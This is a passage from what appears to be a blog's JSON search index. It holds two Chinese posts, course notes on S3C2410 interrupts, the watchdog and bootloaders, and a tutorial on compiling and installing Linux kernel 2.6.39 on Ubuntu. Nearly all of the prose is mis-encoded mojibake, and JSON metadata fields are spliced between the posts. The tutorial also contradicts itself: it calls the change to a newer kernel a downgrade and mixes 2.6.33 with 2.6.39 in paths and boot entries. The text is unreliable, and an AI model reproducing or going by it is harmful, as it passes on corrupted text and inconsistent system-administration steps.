¹æ®ä¸­æ–­æºå‘é‡è¡¨çš„é¦–åœ°å€å’Œåç§»é‡å¯„å­˜å™¨æ‰¾å‡ºåˆ°åº•æ˜¯å“ªä¸ªä¸­æ–­å‘ç”Ÿäº†ã€‚ç„¶åè·³è½¬åˆ°ç›¸åº”çš„ä¸­æ–­å¤„ç†å‡½æ•°ï¼Œæ¯”å¦‚è·³åˆ°ä¸²å£ä¸­æ–­ï¼Œè¿˜å¯ä»¥æ ¹æ®æŒ‚èµ·ä½ï¼ˆå³ä¸­æ–­æ ‡å¿—ä½ï¼‰å†æ¬¡åˆ¤æ–­åˆ°åº•æ˜¯æ¥æ”¶ä¸­æ–­è¿˜æ˜¯å‘é€å®Œæˆä¸­æ–­ã€‚ä¹Ÿå°±æ˜¯è¯´2410å¤„ç†æµç¨‹é™¤äº†ARMå¯¹å¼‚å¸¸çš„å“åº”æ˜¯ç¡¬ä»¶æœºåˆ¶å¤–ï¼Œå…¶ä½™çš„éƒ½æ˜¯ä»£ç å®ç°çš„ã€‚æˆ‘ä»¬åœ¨ç¼–ç¨‹çš„æ—¶å€™æ²¡æœ‰å†™çš„è¯ï¼Œé‚£ä¹Ÿæ˜¯ç¼–è¯‘å™¨åŠ è¿›å»çš„ã€‚\n2410å¯¹åµŒå¥—çš„å¤„ç† æ¯”èµ·2410çš„å¤„ç†æµç¨‹ä¸åŒçš„æ˜¯ï¼Œå› ä¸ºæœ‰äº†ä¸­æ–­æ§åˆ¶å™¨ï¼Œè¿™å°±æ˜¯å®ç°é«˜ä¼˜å…ˆçº§åµŒå¥—çš„ç¡¬ä»¶åŸºç¡€ï¼Œå› ä¸ºæ¯ä¸€æ¬¡è¿›å…¥å¼‚å¸¸æ¨¡å¼ç”¨æˆ·éƒ½ä¼šä¿å­˜ç¯å¢ƒï¼Œè¿™å°±æ˜¯ä¸­æ–­åµŒå¥—çš„è½¯ä»¶åŸºç¡€ã€‚CPUçš„å¼‚å¸¸å¤„ç†æœºåˆ¶æ€»æ˜¯é‚£äº›ï¼Œå¾ˆæ˜ç¡®çš„ã€‚æˆ‘æ­£åœ¨æ‰§è¡Œä¸€ä¸ªä¸­æ–­æœåŠ¡ç¨‹åºï¼Œç„¶åå†æ¬¡å‘ç”Ÿå¼‚å¸¸ï¼Œä¿å­˜ï¼Œè·³è½¬ï¼ˆCPUï¼‰ã€å†æ¬¡åˆ¤æ–­æ˜¯å“ªä¸ªä¸­æ–­ï¼Œè¿›å»ä¹‹åå‹æ ˆï¼Œè¿è¡Œå¦ä¸€ä¸ªä¸­æ–­çš„æœåŠ¡ç¨‹åºï¼Œè¿è¡Œå®Œè¿”å›ï¼Œè¿™æ˜¯å°±æ˜¯è¿”å›åˆ°ä¸Šä¸€ä¸ªä¸­æ–­äº†ã€‚ä¸Šä¸€ä¸ªä¸­æ–­è¿è¡Œå®Œï¼Œä¸€è¿”å›å°±æ˜¯è¿”å›å‘ç”Ÿå¼‚å¸¸å‰çš„çŠ¶æ€ã€‚\nS3C2410çš„ä¸²å£ã€ç«¯å£ã€å¤–éƒ¨ä¸­æ–­ã€ADç­‰åŠå¯„å­˜å™¨çš„ç¼–ç¨‹èƒ½åŠ›ï¼ˆä¼šè¯»datasheetã€ä¼šç¼–ç¨‹ã€ä½œä¸šã€å®éªŒçš„ç›¸å…³ä»£ç ï¼‰ å¯„å­˜å™¨çš„èµ‹å€¼æŒ‡ä»¤\nLDR R0ï¼Œ=GPHCON LDR R1,=0X2AFAAA STR R1ï¼Œ[R0] æ—¶é’Ÿã€çœ‹é—¨ç‹—çš„ç›¸å…³æ¦‚å¿µ æ—¶é’Ÿ: æ•´ä¸ªç³»ç»Ÿæä¾›åŒæ­¥è„‰å†²ï¼Œåƒäººçš„è„‰æä¸€æ ·ã€‚ çœ‹é—¨ç‹—ï¼šå…¶å®æ˜¯ä¸€ä¸ªè®¡æ•°å™¨ï¼Œå½“å®ƒè®¡æ•°æº¢å‡ºçš„æ—¶å€™ï¼Œä¼šä½¿ç³»ç»Ÿå¤ä½ï¼Œæ‰€ä»¥å®ƒçš„ä½œç”¨æ˜¯é˜²æ­¢ç³»ç»Ÿæ­»æœºã€‚æ‰“å¼€çœ‹é—¨ç‹—ä¹‹åï¼Œå½“ä»£ç è·‘é£æˆ–è€…é™·å…¥æ­»å¾ªç¯ä¹‹åï¼Œå°±ä¸èƒ½å–‚ç‹—ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½æ¸…é™¤è®¡æ•°å€¼ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šä½¿ç³»ç»Ÿé‡å¯ã€‚ VIVI ä»€ä¹ˆæ˜¯bootloader Bootloaderï¼Œä¸ºå¼•å¯¼åŠ è½½ç¨‹åºï¼Œæ˜¯åµŒå…¥å¼ç³»ç»ŸåŠ ç”µåè¿è¡Œçš„ç¬¬ä¸€æ®µä»£ç ï¼Œç›¸å½“äºPCæœºçš„BIOSã€‚ Bootloaderåœ¨ç³»ç»Ÿä¸­çš„ä½ç½®ï¼š é€šå¸¸å›ºåŒ–åœ¨ç¡¬ä»¶ä¸Šçš„æŸä¸ªå›ºæ€å­˜å‚¨è®¾å¤‡ä¸Šï¼ŒåŠ ç”µåè‡ªå¯åŠ¨ã€‚\nBootloaderåŠŸèƒ½ï¼š åˆå§‹åŒ–ï¼Œç»™CPUåˆé€‚çš„å·¥ä½œç¯å¢ƒï¼ˆç›¸å½“äºSTARTUP.Sï¼‰ï¼Œä»¥ä¾¿ä¸ºæœ€ç»ˆè°ƒç”¨æ“ä½œç³»ç»Ÿå†…æ ¸æˆ–ç”¨æˆ·åº”ç”¨ç¨‹åºå¢ƒã€‚åŠ è½½å†…æ ¸ï¼Œä¸‹è½½å†…æ ¸æˆ–è€…æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚\nBootloaderæ“ä½œæ¨¡å¼ æœ‰å¯åŠ¨åŠ è½½å’Œä¸‹è½½ä¸¤ç§æ¨¡å¼ã€‚\nå¯åŠ¨åŠ è½½æ¨¡å¼æ˜¯Bootloaderçš„æ­£å¸¸å·¥ä½œæ¨¡å¼ï¼Œåœ¨åµŒå…¥å¼äº§å“å‘å¸ƒçš„æ—¶ä¾¯ï¼ŒBootloaderå¿…é¡»å·¥ä½œåœ¨è¿™ç§æ¨¡å¼ä¸‹ã€‚å³åˆå§‹åŒ–CPUçš„å·¥ä½œç¯å¢ƒä¹‹åï¼Œå°†å†…æ ¸å¦‚RAMæ‰§è¡Œã€‚ ä¸‹è½½æ¨¡å¼ï¼šç›®æ ‡æœºä¸Šçš„Bootloaderå°†é€šè¿‡ä¸²å£è¿æ¥æˆ–ç½‘ç»œè¿æ¥ç­‰é€šä¿¡æ‰‹æ®µä»ä¸»æœºä¸‹è½½æ–‡ä»¶ã€‚ä¸»è¦æ˜¯ä¸‹è½½å†…æ ¸æ˜ åƒå’Œæ ¹æ–‡ä»¶ç³»ç»Ÿæ˜ åƒç­‰ã€‚ä»ä¸»æœºä¸‹è½½çš„æ–‡ä»¶é€šå¸¸é¦–å…ˆè¢«Bootloaderä¿å­˜åˆ°ç›®æ ‡æœºçš„RAMä¸­ï¼Œç„¶åå†è¢«Bootloaderå†™åˆ°ç›®æ ‡æœºä¸Šçš„FLASHç±»å›ºæ€å­˜å‚¨è®¾å¤‡ä¸­ã€‚Bootloaderçš„è¿™ç§æ¨¡å¼é€šå¸¸åœ¨ç¬¬ä¸€æ¬¡å®‰è£…å†…æ ¸ä¸æ ¹æ–‡ä»¶ç³»ç»Ÿæ—¶è¢«ä½¿ç”¨ï¼›æ­¤å¤–ï¼Œä»¥åçš„ç³»ç»Ÿæ›´æ–°ä¹Ÿä¼šä½¿ç”¨åˆ°è¿™ç§å·¥ä½œæ¨¡å¼ã€‚ Bootloaderå¯åŠ¨è¿‡ç¨‹ ä¸Šç”µä¹‹åï¼Œå…ˆå¯åŠ¨CPUå³æ‰§è¡Œstartup.sç±»ä¼¼åŠŸèƒ½ä»£ç ï¼ˆé…ç½®ä¸­æ–­ã€åˆå§‹åŒ–å †æ ˆã€æ‹·è´ä»£ç ç­‰ï¼‰ï¼Œç„¶åè¿›è¡ŒåŠ è½½å†…æ ¸çš„å‡†å¤‡è‡³å°‘åˆå§‹åŒ–ä¸€ä¸ªä¸²å£ï¼Œä»¥ä¾¿å‘ç»ˆç«¯ç”¨æˆ·åé¦ˆæ•°æ®ã€‚æ£€æµ‹ç³»ç»Ÿå†…å­˜æ˜ å°„ï¼Œå“ªäº›æ˜¯å¯ç”¨çš„RAMï¼Ÿåœ¨è¿™ä¸€æ­¥ä¹‹åï¼Œå°†æ£€æµ‹å¤–éƒ¨æŒ‰é”®ï¼Œæœ‰æŒ‰é”®æŒ‰ä¸‹å°†è¿›å…¥ä¸‹è½½æ¨¡å¼ï¼Œæ²¡æœ‰æŒ‰é”®çš„è¯å°†æ‰§è¡Œä¸‹é¢çš„æ­¥éª¤ï¼ŒåŠ è½½å†…æ ¸ï¼š\nå°†kenelå’Œæ ¹æ–‡ä»¶ç³»ç»Ÿä»flashè°ƒå…¥RAM ä¸ºå†…æ ¸å¯åŠ¨è®¾ç½®å‚æ•° è°ƒç”¨å†…æ ¸ã€‚ ","date":1470056667,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1470056667,"objectID":"b572677815d680e38f3946c9cfc0dd16","permalink":"http://www.guozet.me/post/Linux-Embedded-System-Design/","publishdate":"2016-08-01T13:04:27Z","relpermalink":"/post/Linux-Embedded-System-Design/","section":"post","summary":"ã€ŠåµŒå…¥å¼ç³»ç»Ÿè®¾è®¡ã€‹æ¦‚è¿° å‰è¨€ è¿™æ˜¯ã€ŠåµŒå…¥å¼ç³»ç»Ÿè®¾è®¡ã€‹è¿™æœ¬ä¹¦ç±çš„å†…","tags":"Linux kernel","title":"åµŒå…¥å¼ç³»ç»Ÿè®¾è®¡è¯¾ç¨‹","type":"post"},{"authors":null,"categories":"Linux","content":"ä¸€ç›´æƒ³å°†è‡ªå·±çš„linuxå†…æ ¸æ›´æ¢ä¸€ä¸‹ï¼Œæ¢ä¸€ä¸ªä½ç‰ˆæœ¬çš„æ–¹ä¾¿å¹³æ—¶åšå®éªŒè¯¾ç¨‹çš„æ—¶å€™ä½¿ç”¨ï¼Œäºæ˜¯å°±å¼€å§‹äº†Ubuntuä¸‹æ¢å†…æ ¸çš„è¿‡ç¨‹ï¼\nç®€è¦æ¦‚è¿° åŸç³»ç»Ÿï¼šUbuntu 10.10ï¼ˆVirtualboxï¼‰å¹³å°ä¸­çš„linuxå†…æ ¸2.6.35-22\né™çº§ä¸ºï¼šlinuxå†…æ ¸2.6.39\nå…·ä½“æ“ä½œï¼š\né¦–å…ˆä¸‹è½½Linux2.6.39å†…æ ¸å¹¶è§£å‹åˆ°/usr/srcä¸‹ å®‰è£…å¿…å¤‡è½¯ä»¶ç¼–è¯‘å·¥å…· #apt-get install libncurses5-dev build-essentialkernel-package åšä¸ªé“¾æ¥æ–‡ä»¶#ln -s /usr/src/linux2.6.33/usr/src/linux è¿›å…¥linuxæ–‡ä»¶#cd linux #make mrproper (åˆ é™¤ä»¥å‰åˆ°.oæ–‡ä»¶ï¼Œåˆæ¬¡æ›´æ¢å¯ä¸ç”¨) #make menuconfig (è¿™é‡Œå¯ä»¥è®¾ç½®ä¸€äº›å‚æ•°ï¼Œå¹¶ç”Ÿæˆ.configæ–‡ä»¶) #make dep (å»ºç«‹ä¾èµ–å…³ç³») #make clean (åˆ é™¤æ²¡æœ‰ç”¨çš„æ–‡ä»¶) #make bzImage (ç¼–è¯‘linuxå†…æ ¸) #make modules (ç¼–è¯‘linuxæ¨¡å—) #makemodules_install (å®‰è£…linuxæ¨¡å—) #make install (å»ºç«‹initrdæ–‡ä»¶, åŠ è½½LKMç”¨çš„ç¨‹åº) ç”Ÿæˆinitrd.imgæ–‡ä»¶ï¼š cd /lib/modules/2.6.39 update-initramfs -c -k 2.6.39 è‡ªåŠ¨æŸ¥æ‰¾æ–°å†…æ ¸ï¼Œå¹¶æ·»åŠ åˆ°grubå¼•å¯¼#update-grub\n#shutdown -r now ï¼ˆç«‹å³é‡å¯ï¼Œé‡å¯åä¼šå‘ç°å¤šäº†ä¸€ä¸ªlinux2.6.33åˆ°å¯åŠ¨é¡¹ï¼‰\nä»¥ä¸‹è¿‡ç¨‹å…¨éƒ¨åœ¨rootæƒé™ä¸‹æ“ä½œ**:**\\\nè¯¦ç»†æ­¥éª¤åˆ†æ ä¸‹è½½å†…æ ¸ å†…æ ¸ä¸‹è½½å®˜ç½‘ï¼š https://www.kernel.org/\nä¸‹è½½å†…æ ¸ï¼š2.6.39 è¯¥å†…æ ¸ç‰ˆæœ¬ä¸è‡ªå·±å½“å‰ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬2.6.35-22æ¯”è¾ƒæ¥è¿‘\næ¦‚å¿µï¼šå†…æ ¸ï¼Œæ˜¯ä¸€ä¸ªæ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒã€‚å®ƒè´Ÿè´£ç®¡ç†ç³»ç»Ÿçš„è¿›ç¨‹ã€å†…å­˜ã€è®¾å¤‡é©±åŠ¨ç¨‹åºã€æ–‡ä»¶å’Œç½‘ç»œç³»ç»Ÿï¼Œå†³å®šç€ç³»ç»Ÿçš„æ€§èƒ½å’Œç¨³å®šæ€§ã€‚åœ¨å¹¿å¤§çˆ±å¥½è€…çš„æ”¯æŒä¸‹ï¼Œå†…æ ¸ç‰ˆæœ¬ä¸æ–­æ›´æ–°ã€‚æ–°çš„å†…æ ¸ä¿®è®¢äº†æ—§å†…æ ¸çš„bugï¼Œå¹¶å¢åŠ äº†è®¸å¤šæ–°çš„ç‰¹æ€§ã€‚å¦‚æœç”¨æˆ·æƒ³è¦ä½¿ç”¨è¿™äº›æ–°ç‰¹æ€§ï¼Œæˆ–æƒ³æ ¹æ®è‡ªå·±çš„ç³»ç»Ÿåº¦èº«å®šåˆ¶ä¸€ä¸ªæ›´é«˜æ•ˆï¼Œæ›´ç¨³å®šçš„å†…æ ¸ï¼Œå°±éœ€è¦é‡æ–°ç¼–è¯‘å†…æ ¸ã€‚\nä¸ºä»€ä¹ˆéœ€è¦é‡æ–°ç¼–è¯‘å†…æ ¸ï¼Ÿ\nå¢åŠ å¯¹æŸéƒ¨åˆ†åŠŸèƒ½çš„æ”¯æŒï¼Œæ¯”å¦‚ç½‘ç»œä¹‹ç±»ï¼Œå¯ä»¥æŠŠç›¸åº”éƒ¨åˆ†ç¼–è¯‘åˆ°å†…æ ¸ä¸­ï¼ˆbuild-inï¼‰ï¼Œåœ¨å†…æ ¸å¯åŠ¨æ—¶å°±å¯ä»¥è‡ªåŠ¨æ”¯æŒç›¸åº”éƒ¨åˆ†çš„åŠŸèƒ½ï¼Œè¿™æ ·çš„ä¼˜ç‚¹æ˜¯æ–¹ä¾¿ã€é€Ÿåº¦å¿«ï¼Œæœºå™¨ä¸€å¯åŠ¨ï¼Œä½ å°±å¯ä»¥ä½¿ç”¨è¿™éƒ¨åˆ†åŠŸèƒ½äº†,æˆ‘ä»¬å¯å°†ç»å¸¸ä½¿ç”¨çš„éƒ¨åˆ†ç›´æ¥ç¼–è¯‘åˆ°å†…æ ¸ä¸­ï¼Œæ¯”å¦‚ç½‘å¡ã€‚é™æ€è°ƒç”¨çš„ç¼ºç‚¹æ˜¯ä¼šä½¿å†…æ ¸å˜å¾—åºå¤§èµ·æ¥ï¼Œä¸ç®¡ä½ æ˜¯å¦éœ€è¦è¿™éƒ¨åˆ†åŠŸèƒ½ï¼Œå®ƒéƒ½ä¼šå­˜åœ¨ã€‚ä¹Ÿå¯ä»¥æŠŠè¯¥éƒ¨åˆ†ç¼–è¯‘æˆæ¨¡å—ï¼ˆmoduleï¼‰ï¼Œè¦ä½¿ç”¨çš„æ—¶å€™å†åŠ¨æ€è°ƒç”¨ã€‚å¦‚æœç¼–è¯‘æˆæ¨¡å—ï¼Œå°±ä¼šç”Ÿæˆå¯¹åº”çš„.o æ–‡ä»¶ï¼Œåœ¨ä½¿ç”¨çš„æ—¶å€™å¯ä»¥åŠ¨æ€åŠ è½½ï¼Œä¼˜ç‚¹æ˜¯ä¸ä¼šä½¿å†…æ ¸è¿‡åˆ†åºå¤§ï¼Œç¼ºç‚¹æ˜¯ä½ å¾—è‡ªå·±æ¥è°ƒç”¨è¿™äº›æ¨¡å—ã€‚\nå®‰è£…å¿…å¤‡è½¯ä»¶ç¼–è¯‘å·¥å…·:.\napt-get install libncurses5-dev build-essential kernel-package** è¿™å‡ ä¸ªæ–‡ä»¶ä»‹ç»ï¼š\nlibncurses5-devæ˜¯ä¸ºä¹‹åé…ç½®å†…æ ¸èƒ½è¿è¡Œ make menuconfigç¨‹åºåšå‡†å¤‡ Build-essentialä¸ºç¼–è¯‘å·¥å…·ï¼› kernel-packageæ˜¯ç¼–è¯‘å†…æ ¸å·¥å…·ã€‚ å¦‚æœç³»ç»Ÿæ˜¾ç¤ºæ— æ³•æŸ¥æ‰¾åˆ°è¿™ä¸‰ä¸ªæ–‡ä»¶ï¼Œè¾“å…¥#apt-get updateæ›´æ–°æ•°æ®æºï¼Œæ›´æ–°å®Œä¹‹åå³å¯æ‰¾åˆ°è¿™ä¸‰ä¸ªæ–‡ä»¶äº†ã€‚\nç¼–è¯‘æ›¿æ¢å†…æ ¸ è§£å‹å†…æ ¸æ–‡ä»¶linux 2.6.39åˆ°/usr/srcä¸‹xx é¦–å…ˆå…ˆå°†ä¸‹è½½çš„å†…æ ¸æ‹·è´åˆ°/usr/srcç›®å½•ä¸‹ï¼›/usr/src/ç›®å½•æ˜¯linuxå†…æ ¸æºç å­˜æ”¾çš„ç›®å½•ï¼Œé‡Œé¢çš„å†…æ ¸æºç ç›®å½•ä¸ºï¼šlinux-2.XX.XXç›®å½•ç­‰ã€‚\nè¿™é‡Œè§£å‹åˆ°ä»»ä½•ç›®å½•éƒ½è¡Œï¼Œå› ä¸ºåœ¨è¿™é‡Œæˆ‘ä»¬æ˜¯è¦å¢åŠ ä¸€ä¸ªå†…æ ¸ï¼Œè€Œä¸æ˜¯è¦†ç›–æ‰åŸæœ‰ç³»ç»Ÿçš„å†…æ ¸ï¼Œå³ä½¿æ˜¯è¦†ç›–æ‰åŸæœ‰ç³»ç»Ÿå†…æ ¸ï¼Œä¹Ÿå¯ä»¥åœ¨åé¢æ‰§è¡Œ#make install è‡ªåŠ¨å°±ä¼šå°†å¯¹åº”æ–‡ä»¶æ‹·è´åˆ°æœ¬æœºç›¸åº”çš„ç›®å½•ä¸‹å»äº†ã€‚\nè§£å‹å‘½ä»¤ï¼š\ntar -jxvf linux-2.6.39.tar.bz2 æ³¨ï¼šè¾ƒæ–°çš„å†…æ ¸æ–‡ä»¶ä»¥tar.xzç»“å°¾çš„å‹ç¼©æ–‡ä»¶æ—¶ï¼Œå¦‚ä½•è§£å‹\nxz -d ***.tar.xz tar -xvf ***.tar å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‹ç¼©åŒ…ä¹Ÿæ˜¯æ‰“åŒ…åå†å‹ç¼©ï¼Œå¤–é¢æ˜¯xzå‹ç¼©æ–¹å¼ï¼Œé‡Œå±‚æ˜¯taræ‰“åŒ…æ–¹å¼ã€‚è¡¥å……ï¼šç›®å‰å¯ä»¥ç›´æ¥ä½¿ç”¨ tar xvJf ***.tar.xzæ¥è§£å‹\nè¿›å…¥å†…æ ¸æºç ç›®å½•ï¼š#cd /usr/src/linux-2.6.39/å¯ä»¥æŸ¥çœ‹ç›¸åº”å†…æ ¸æ–‡ä»¶\nåšä¸ªé“¾æ¥æ–‡ä»¶#ln -s /usr/src/linux2.6.39 /usr/src/linux è¿›å…¥linuxæ–‡ä»¶#cd /usr/src/linux\n/usr/src/linuxè¿™ä¸ªç›®å½•æ˜¯ç¼–è¯‘å†…æ ¸æ—¶å­˜æ”¾æºä»£ç çš„ç›®å½•ï¼Œè€Œï¼usr/src/linux2.6.33è¿™ä¸ªç›®å½•æ˜¯å®é™…å­˜æ”¾ä»£ç çš„ç›®å½•ï¼å³åœ¨/usr/srcä¸­å»ºç«‹ä¸€ä¸ªè½¯é“¾æ¥\nå®šåˆ¶å†…æ ¸ #make mrproper\næ¸…ç†ä»¥å‰åŠ è½½çš„æ¨¡å—ï¼Œç¬¬ä¸€æ¬¡å¯çœç•¥\nåœ¨æ¯æ¬¡é…ç½®å¹¶é‡æ–°ç¼–è¯‘å†…æ ¸å‰éœ€è¦å…ˆæ‰§è¡Œâ€œmakemrproperâ€å‘½ä»¤æ¸…ç†æºä»£ç æ ‘ï¼ŒåŒ…æ‹¬è¿‡å»æ›¾ç»é…ç½®çš„å†…æ ¸é…ç½®æ–‡ä»¶â€œ.configâ€éƒ½å°†è¢«æ¸…é™¤ã€‚å®éªŒå®Œæˆä¹‹åï¼Œåœ¨æµ‹è¯•äº†ä¸€ä¸‹è¿™ä¸ªå‘½ä»¤ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå³è¿›è¡Œæ–°çš„ç¼–è¯‘å·¥ä½œæ—¶å°†åŸæ¥æ—§çš„é…ç½®æ–‡ä»¶ç»™åˆ é™¤åˆ°ï¼Œä»¥å…å½±å“æ–°çš„å†…æ ¸ç¼–è¯‘ã€‚\nå³æ£€æŸ¥æœ‰æ— ä¸æ­£ç¡®çš„.oæ–‡ä»¶å’Œä¾èµ–å…³ç³»ï¼Œå¦‚æœä½¿ç”¨åˆšä¸‹è½½çš„å®Œæ•´çš„æºç¨‹åºåŒ…å³ç¬¬ä¸€æ¬¡è¿›è¡Œç¼–è¯‘ï¼Œé‚£ä¹ˆæœ¬æ­¥å¯ä»¥çœç•¥ã€‚è€Œå¦‚æœä½ å¤šæ¬¡ä½¿ç”¨äº†è¿™äº›æºç¨‹åºç¼–è¯‘å†…æ ¸ï¼Œåˆ™æœ€å¥½è¦å…ˆè¿è¡Œä¸€ä¸‹è¿™ä¸ªå‘½ä»¤ã€‚\n#make menuconfig\nè¿™é‡Œå¯ä»¥è®¾ç½®ä¸€äº›å‚æ•°ï¼Œå¹¶ç”Ÿæˆ.configæ–‡ä»¶, ä½¿ç”¨makemenuconfig ç”Ÿæˆçš„å†…æ ¸é…ç½®æ–‡ä»¶ï¼Œå†³å®šå°†å†…æ ¸çš„å„ä¸ªåŠŸèƒ½ç³»ç»Ÿç¼–è¯‘è¿›å†…æ ¸è¿˜æ˜¯ç¼–è¯‘ä¸ºæ¨¡å—ï¼Œæˆ–è€…ä¸ç¼–è¯‘ã€‚\nåœ¨è¿™é‡Œå°±ä¸ä»‹ç»å…·ä½“çš„å†…æ ¸é…ç½®æ“ä½œï¼Œä½†æ˜¯å»ºè®®å°±ç®—ä¸æ‰“ç®—é…ç½®ä»€ä¹ˆä¹Ÿæ‰§è¡Œä¸€ä¸‹make menuconfigè¿™ä¸ªå‘½ä»¤ï¼Œå¹¶åœ¨é€€å‡ºçš„æ—¶å€™è¿›è¡Œä¿å­˜ï¼Œå› ä¸ºå¦‚æœä¸æ‰§è¡Œæ­¤æ“ä½œçš„è¯åœ¨åé¢makeç¼–è¯‘å†…æ ¸çš„æ—¶å€™ä¼šæç¤ºä½ å›ç­”å¾ˆå¤šé—®é¢˜ã€‚\nè¿™ä¸€æ­¥å¯ä»¥#cp /boot/config-XX /usr/src/linux/.configï¼Œå³ä½¿ç”¨å½“å‰ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œä¹‹åè¿›å…¥make menuconfig é€‰æ‹©loadé…ç½®æ–‡ä»¶ä¹‹åï¼Œå†åšç»†å¾®æ”¹åŠ¨ï¼Œæˆ–è€…ä¸æ”¹åŠ¨ä¹Ÿå¯ã€‚\næ‰§è¡Œ#cp /boot/config-ï¼Œç„¶åæŒ‰ä¸‹Tabé”®ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å¡«ä¸Šè¯¥ç›®å½•ä¸‹ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶åï¼Œç„¶åç»§ç»­è¾“å…¥ .configï¼Œç›®çš„æ˜¯ä½¿ç”¨åœ¨bootç›®å½•ä¸‹çš„åŸé…ç½®æ–‡ä»¶ã€‚\n3.ç¼–è¯‘å®‰è£…å†…æ ¸å’Œæ¨¡å—\n#make dep å»ºç«‹ä¾èµ–å…³ç³»\næ ¹æ®ä¸Šä¸€æ­¥ä¸­åŠ è½½çš„é…ç½®å†…å®¹ï¼ˆ.configï¼‰å»ºç«‹æ–‡ä»¶çš„ä¾èµ–å…³ç³»ã€‚\n#make clean æ¸…é™¤å†…æ ¸ç¼–è¯‘çš„ç›®æ ‡æ–‡ä»¶\næ¸…ç†ä¸€äº›ä¸å¿…è¦çš„æ–‡ä»¶ï¼Œå¦‚æœä½ åœ¨ä¸Šæ¬¡ç¼–è¯‘çš„åŸºç¡€ä¸Šï¼Œåˆ å»äº†ä¸€äº›é€‰é¡¹ï¼Œå»ºè®®ä½ æ‰§è¡Œè¿™ä¸€æ­¥æ“ä½œï¼Œå¦åˆ™ï¼Œå°±æ²¡æœ‰å¿…è¦äº†ã€‚\n#make bzImage ç¼–è¯‘å†…æ ¸\nå†…æ ¸ç¼–è¯‘æˆåŠŸåï¼Œä¼šåœ¨æºç æ ‘æ ¹ç›®å½•å³/usr/src/linux-2.6.39/arch/x86/boot/ç›®å½•ä¸­ç”Ÿæˆä¸€ä¸ªæ–°å†…æ ¸çš„æ˜ åƒæ–‡ä»¶bzImageã€‚\n#make modules ç¼–è¯‘æ¨¡å—\nç¼–è¯‘å¯åŠ è½½æ¨¡å—ï¼ˆå³å†…æ ¸é€‰é¡¹ä¸­é€‰æ‹©ä¸ºMçš„é€‰é¡¹ï¼‰ï¼Œä»¥ä¾¿å°†æ¥ä½¿ç”¨insmodå‘½ä»¤è¿›è¡ŒåŠ è½½ã€‚ç¼–è¯‘æ—¶é—´è·ŸMé€‰é¡¹çš„æ•°é‡æœ‰å…³ã€‚\n#make modules_install å®‰è£…æ¨¡å—\nç¼–è¯‘æˆåŠŸåï¼Œç³»ç»Ÿä¼šåœ¨/lib/modulesç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª2.6.39å­ç›®å½•ï¼Œé‡Œé¢å­˜æ”¾ç€æ–°å†…æ ¸çš„æ‰€æœ‰å¯åŠ è½½æ¨¡å—(å³å°†ç¼–è¯‘å¥½çš„modulesæ‹·è´åˆ°/lib/modulesä¸‹)ã€‚\n#make install\nå®‰è£…å†…æ ¸,å³å¤åˆ¶.configï¼Œvmlinuzï¼Œinitrd.imgï¼ŒSystem.mapæ–‡ä»¶åˆ°/bootç›®å½•ã€æ›´æ–°grubã€‚\nå½“ç„¶ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ†åˆ«æ‹·è´åˆ°/bootç›®å½•ï¼š\nå°†ç”Ÿæˆçš„linux-2.6.39/.config æ‹·è´åˆ°è¦æ›¿æ¢å†…æ ¸ç³»ç»Ÿçš„/bootä¸‹ï¼Œå¹¶é‡å‘½åä¸ºconfig-2.6.39 å°†ç”Ÿæˆçš„linux-2.6.39/arch/x86-64/boot/bzImageæ‹·è´åˆ°è¦æ›¿æ¢å†…æ ¸ç³»ç»Ÿçš„/bootä¸‹ï¼Œå¹¶é‡å‘½åä¸ºvmlinuz-2.6.39ï¼ˆæ³¨ï¼šè¿™é‡Œéœ€ç‰¹åˆ«æ³¨æ„æ‹·è´åçš„æ–‡ä»¶åå˜ä¸ºvmlinuz-x.x.xï¼‰ã€‚ å°†ç”Ÿæˆçš„linux-2.6.39/System.mapæ‹·è´åˆ°è¦æ›¿æ¢å†…æ ¸ç³»ç»Ÿçš„/bootä¸‹ï¼Œå¹¶é‡å‘½åä¸ºSystem.map-2.6.39 å°†make modules_installç”Ÿæˆçš„ç³»ç»Ÿç›®å½•/lib/modules/linux-2.6.39æ‹·è´åˆ°è¦æ›¿æ¢å†…æ ¸ç³»ç»Ÿçš„/lib/modulesä¸‹ã€‚ #new-kernel-pkg --install --mkinitrd --depmod 2.6.33(å°†å¯åŠ¨ä¿¡æ¯å†™å…¥grub.confä¸­ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥å»/etc/ç¼–è¾‘grub.confæ–‡ä»¶ï¼Œå°†å¯åŠ¨ä¿¡æ¯æ¨¡ä»¿åŸæ¥åˆ°å†™è¿›å»ã€‚æ³¨ï¼šæœ‰çš„linuxç‰ˆæœ¬æ˜¯ lilo.confæ–‡ä»¶) (æµ‹è¯•äº†ä¸€ä¸‹ç½‘ä¸Šæµä¼ çš„è¿™æ¡æŒ‡ä»¤ï¼Œåœ¨æˆ‘çš„ç”µè„‘ä¸Šè¿™æ¡å‘½ä»¤æ²¡æœ‰ååº”)\ncd /lib/modules/2.6.39 update-initramfs â€“c â€“k 2.6.39 #ç”Ÿæˆ/boot/initrd.img-2.6.39æ–‡ä»¶ #update-grub\nè‡ªåŠ¨æŸ¥æ‰¾æ–°å†…æ ¸ï¼Œå¹¶æ·»åŠ åˆ°grupå¼•å¯¼ä¸­\n#shutdown -r now\nç«‹å³é‡å¯ï¼Œé‡å¯åæŒ‰shiftä¼šå‘ç°å¤šäº†ä¸€ä¸ªlinux2.6.39å¯åŠ¨é¡¹ã€‚\nè¡¥å……ï¼šå¦‚ä½•åœ¨å¯åŠ¨ç•Œé¢ä¸­åŠ å…¥ä½ 